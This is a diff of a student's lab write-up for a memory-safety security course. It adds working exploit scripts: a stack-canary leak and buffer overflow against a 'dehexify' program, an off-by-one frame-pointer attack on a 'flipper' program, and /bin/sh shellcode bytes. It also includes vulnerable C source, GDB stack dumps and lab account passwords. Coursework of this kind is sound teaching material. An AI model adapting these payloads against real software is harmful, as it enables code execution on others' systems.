@@ -1,7 +1,12 @@
 # Preliminaries
 ## Attack Workflow
 > [!important]
-> The output of `egg` is forwarded to the input file, so `print` statements in `egg` will be written to the file.
+> The output of `egg` is forwarded to the input file, so `print` statements in `egg` will be written to the file.
+> 
+> Whatever bytes are printed from the `egg` file will be sent as input to the vulnerable program. Note that at the top of all of our files, including the `egg` file, is a [shebang line](https://en.wikipedia.org/wiki/Shebang_(Unix)). The shebang line tells the operating system that this executable should be run as a Python file:
+> ![](Project_1.assets/image-20240304190725627.png)
+
+
 
  
 ## Login
@@ -299,8 +304,13 @@ int main(void) {
 
 ## Main Idea
 > [!code]
-
-
+> Polaris includes a stack canary, which protects against typical stack smashing by generating a random 4-byte value at runtime directly adjacent to the sfp. Our approach involved exploiting the input processing of dehexify to read the canary value, so that during the buffer overflow, the canary value can be preserved.
+> 
+> The goal being to insert the Shellcode into the stack while preserving stack canary values, our exploit first read the canary value. 
+> 
+> The function dehexify loops over all elements in c.buffer sent through p.send(s), and upon detecting the sequence "\x", it reads in the following 2 bytes of c.buffer without inspection regardless of their values. As such, we sent 12 bytes of padding and "\\x", which skips over the terminator into the canary in stack memory.  **Then the stack canary's value will be copied to the `answer[13:17]`(which is an overflow actually).** This is the key part.
+> 
+> The response containing the canary values were collected using the `p.recv(17)[13:17]` function. Finally, sending the concatenation of 32 bytes of garbage, the canary, 12 bytes of garbage, the little-endian formatted address `\xf0\xd7\xff\xff`, and the SHELLCODE overwrites the stack as desired. This replaces the RIP with an address that points to the SHELLCODE provided, yet the canary appears unchanged.
 
 
 
@@ -316,40 +326,305 @@ int main(void) {
 
 ## Exploit Structure
 > [!code]
-> ![](Project_1.assets/image-20240302173430868.png)
-   We want to first pad from buffer 24 bytes to reach stack canary: 
+> ![](Project_1.assets/image-20240304183458049.png)![](Project_1.assets/image-20240304183514706.png)
+> Across different run, we find the location of stack canary, which is at `0xffffd7dc`, which is different from in lecture(which is located 4 bytes below `sfp`).
+> 
+> 
+> ![](Project_1.assets/image-20240304215515777.png)
+> 
+
 
    
 
 ## Exploit GDB Output
 > [!code]
+> **Before exploiting:**
+> ![](Project_1.assets/image-20240304215930017.png)
+> **After exploiting:**
+> 
+> ![](Project_1.assets/image-20240304215950883.png)
+> **The Exploit Output:**
+> 
+> ![](Project_1.assets/image-20240304220039277.png)
 
 
 
-## Solution Interact
-> [!code]
 
 
-# Q4 Off-by-one Attack
+
+## Solutions
+> [!code] egg
+> 
+```c
+#!/usr/bin/env python3
+
+import scaffold as p
+from scaffold import SHELLCODE
+import sys
+
+# Configure Python to print text strings like byte strings. Don't remove this!
+sys.stdout.reconfigure(encoding='latin1')
+
+### YOUR CODE STARTS HERE ###
+
+# Program start:
+p.start()
+
+# Send
+p.send('A'*12+'\\x\n')
+
+program_output = p.recv(17)
+
+stack_canary = program_output[-4:]
+print([hex(ord(c)) for c in stack_canary])
+
+p.send('A'*32 + stack_canary + 'A'*12 + '\xf0\xd7\xff\xff' + SHELLCODE)
+
+### YOUR CODE ENDS HERE ###
+```
+
+
+# Q4 Off-by-one Attack - Medium
 > [!overview]
 > See [Off-By-One Vulnerabilities(Fencepost)](2_Memory_Vulnerability.md#Off-By-One%20Vulnerabilities(Fencepost))
+> `username`: vegas
+> `password`: whyishould
+
+
+## File Structure
+> [!important]
+> The `exploit` script in this question is slightly different. The output of `egg` is used as an _environment variable_, which means its value is placed at the top of the stack. The output of `arg` is used as the input to the program, passed as an argument on the command line (in the `argv` array to `main`).
+> ![](Project_1.assets/image-20240304190210204.png)![](Project_1.assets/image-20240304190220882.png)
+> Here we see the program `exploit` will send an environment variable `EGG=$(./egg)` which is the output from `egg` file to the `flipper` program, which can access it by `p environ[4]` in GDB.
+> - `environ[0]` is "SHLVL=1"
+> - `environ[1]` is "PAD=", `\377` <repeats 196 times>
+> - `environ[2]` is "TERM=screen"
+> - `environ[3]` is "SHELL=/biun/sh"
+> - `environ[4]` is "EGG=<user_input>"
+> 
+> Also `flipper` takes in an argument `$(./arg)`, which is the output from program `arg`, which can be fetched by `argv[1]`.
+
+
+
 
 ## Vulnerable Code
+> [!code]
+```c
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+
+void flip(char *buf, const char *input) {
+    size_t n = strlen(input);
+    int i;
+	// This is vulnerable, where i <= 64 indicates that
+	// we could overwrite one more buffer if the input 
+	// length n > 64. Or more precisely, is 65.
+    for (i = 0; i < n && i <= 64; i++) {
+        buf[i] = input[i] ^ 0x20;
+    }
+    // Can be circumvented if i = 65 from above loop.
+    while (i < 64) {
+        buf[i++] = '\0';
+    }
+}
+
+
+// Note that here we have two functions to make OFF-By-One Attack possible since the first time invoke return
+// Nothing happens actually, only the EBP has been set to 
+// our maliciously designed location.
+// But when the dispatch returns, we have to move ESP to malicious EBP, making the attack possible.
+void invoke(const char *in) {
+    char buf[64];
+    flip(buf, in);
+    puts(buf);
+}
+
+void dispatch(const char *in) {
+    invoke(in);
+}
+
+int main(int argc, char **argv) {
+    if (argc != 2) {
+        return 1;
+    }
+
+    dispatch(argv[1]);
+    return 0;
+}
+```
+
+
 
 
 ## Main Idea
+> [!code]
+> In this problem, since each input byte is `XOR-ed` with `0x20`, which says that we want to decrease the original result by 32.(xor on the 6-th bit). Since our buf is 64 bytes, so we should put our `Faked EBP` at 32 bytes below the `EBP` of `invoke`. `Fake RIP` is just above it.
+> 
+> Since putting `SHELLCODE` in the buf is complicated, since we need to xor it bit-by-bit.
+> 
+> Thus `SHELLCODE` is generally put at the environment variable of the program, whose address is typically fixed across multiple execution. In this problem, it is fixed to be `0xffffdf9c`. 
+> 
+> Thus we just need to write our `FAKED RIP` to be `0xdfdfffbc` since `0xdfdfffbc ^ 0x00100000 = 0xffffdf9c`.
+```c
+#!/usr/bin/env python3
+
+import sys
+
+# Configure Python to print text strings like byte strings. Don't remove this!
+sys.stdout.reconfigure(encoding='latin1')
+
+### YOUR CODE HERE ###
+print('A'*36+'\xbc\xff\xdf\xdf'+'A'*24+'\x70')
+```
+
+
 
 ## Magic Numbers
+> [!code]
+> ![](Project_1.assets/image-20240304205532678.png)
+> We have `EBP` at `0xffffd770` and `RIP` at `0xffffd774` .
+
+
+
 
 
 ## Exploit Structure
+> [!concept] Stack Structure
+> ![](Project_1.assets/image-20240304205618278.png)
+
+
+
+
+
 
 
 ## Exploit GDB Output
+> [!code]
+> **Buf before our exploit:**
+> 0xffffd730:     0x00000000      0x00000001      0x00000000      0xffffd8eb
+> 0xffffd740:     0x00000002      0x00000000      0x00000000      0x00000000
+> 0xffffd750:     0x00000000      0xffffdfe5      0xf7ffc540      0xf7ffc000
+> 0xffffd760:     0x00000000      0x00000000      0x00000000      0x00000000
+> 0xffffd770:     0xffffd77c
+> 
+> **Buf after our exploit**
+> 0xffffd730:     <font color="#4f81bd">0x61616161      0x61616161      0x61616161      0x61616161</font>
+> 0xffffd740:     <font color="#4f81bd">0x61616161      0x61616161      0x61616161      0x61616161</font>
+> 0xffffd750:     <font color="#4f81bd">0x61616161</font>      <font color="#ff0000">0xffffdf9c</font>      <font color="#4f81bd">0x61616161      0x61616161</font>
+> 0xffffd760:     <font color="#4f81bd">0x61616161      0x61616161      0x61616161      0x61616161</font>
+> 0xffffd770: <font color="#ff0000">0xffffd750</font>
+> ![](Project_1.assets/image-20240304204620286.png)
 
 
-# Q5 
+## Solution Files
+> [!code] egg
+```c
+#!/usr/bin/env python3
+
+import sys
+
+# Configure Python to print text strings like byte strings. Don't remove this!
+sys.stdout.reconfigure(encoding='latin1')
+
+SHELLCODE = \
+    '\x6a\x32\x58\xcd\x80\x89\xc3\x89\xc1\x6a' \
+    '\x47\x58\xcd\x80\x31\xc0\x50\x68\x2d\x69' \
+    '\x69\x69\x89\xe2\x50\x68\x2b\x6d\x6d\x6d' \
+    '\x89\xe1\x50\x68\x2f\x2f\x73\x68\x68\x2f' \
+    '\x62\x69\x6e\x89\xe3\x50\x52\x51\x53\x89' \
+    '\xe1\x31\xd2\xb0\x0b\xcd\x80'
+
+### YOUR CODE HERE ###
+print(SHELLCODE)
+```
+
+> [!code] arg
+```c
+#!/usr/bin/env python3
+
+import sys
+
+# Configure Python to print text strings like byte strings. Don't remove this!
+sys.stdout.reconfigure(encoding='latin1')
+
+### YOUR CODE HERE ###
+print('A'*36+'\xbc\xff\xdf\xdf'+'A'*24+'\x70')
+```
+
+# Q5 Buffer Overflow Attack III
+> [!overview]
+> `username`: deneb
+> `password`: neveruse
+
+## File Structure
+
+
 ## Vulnerable Code
+> [!code]
+```c
+#include <errno.h>
+#include <fcntl.h>
+#include <stdint.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <sys/stat.h>
+#include <unistd.h>
+
+#define MAX_BUFSIZE 128
+#define FILENAME "hack"
+
+/* Hint: No memory safety errors in this function */
+#define EXIT_WITH_ERROR(message) do { \
+    fprintf(stderr, "%s\n", message); \
+    exit(EXIT_FAILURE); \
+} while (0);
+
+/* Hint: No memory safety errors in this function */
+int file_is_too_big(int fd) {
+    struct stat st;
+    fstat(fd, &st);
+    return st.st_size >= MAX_BUFSIZE;
+}
+
+void read_file(void) {
+    char buf[MAX_BUFSIZE];
+    uint32_t bytes_to_read;
+    int fd;
+    ssize_t bytes_read;
+
+    fd = open(FILENAME, O_RDONLY);
+    if (fd == -1) {
+        EXIT_WITH_ERROR("Could not find file!");
+    }
+
+    if (file_is_too_big(fd)) {
+        EXIT_WITH_ERROR("File too big!");
+    }
+
+    printf("How many bytes should I read? ");
+    fflush(stdout);
+    if (scanf("%u", &bytes_to_read) != 1) {
+        EXIT_WITH_ERROR("Could not read the number of bytes to read!");
+    }
+
+    bytes_read = read(fd, buf, bytes_to_read);
+    if (bytes_read == -1) {
+        EXIT_WITH_ERROR("Could not read!");
+    }
+
+    buf[bytes_read] = 0;
+    printf("Here is the file!\n%s", buf);
+    close(fd);
+}
+
+int main(void) {
+    read_file();
+    return 0;
+}
+```
+
 
 
 ## Main Idea
